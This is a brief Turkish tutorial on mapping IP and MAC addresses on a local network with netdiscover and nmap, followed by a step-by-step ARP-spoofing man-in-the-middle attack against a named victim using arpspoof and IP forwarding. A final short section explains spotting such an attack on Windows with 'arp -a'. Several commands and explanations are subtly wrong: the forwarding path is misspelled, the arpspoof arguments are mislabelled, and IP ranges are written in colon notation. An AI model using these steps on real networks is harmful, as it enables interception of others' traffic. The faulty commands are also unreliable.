# IP ve MAC Adresi Eşleme
> Netdiscover

```netdiscover -i eth0 -r XX:XX:XX/24 -c 10``` 

* -r: eth0'daki inet'in ilk 6 hanesi
* -c: deneme sayısı

> nmap

``` nmap XX:XX.XX.0/24 ```  0 ve 24 yani tüm aralıktaki IPlere istek atar, IP ve MAC adreslerini eşleştirip ekstra bilgi verir. Atılan istekleri
karşı taraf görebilir

# MITM

* İlk olarak **arpspoof**'u indirmemiz gerekiyor onun için:
```apt install dsniff```

* ```arpspoof -i eth0 -t XX:XX:XX:XX YY:YY:YY:YY```  target'a kendimizi modem olarak tanıtıyoruz

-t: Kurban IP

YY:YY:YY:YY : Kendi IP adresimiz 

* ```arpspoof -i eth0 -t YY:YY:YY:YY XX:XX:XX:XX``` modem'e kendimizi target olarak tanıtıyoruz

-t: Kendi IP'miz
XX:XX:XX:XX : Kurban IP

* ``` echo 1 > /proc/sys/net/ipv4/ip-forward``` IP forwardlamayı etkinleştirerek **hedef pc'nin** ağdan kopmamasını sağlıyoruz

## Windows Bilgisayarımıza MITM Saldırısı Var Mı ?

Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yazarak modem ile aynı MAC adresine sahip birisi var mı görüyoruz
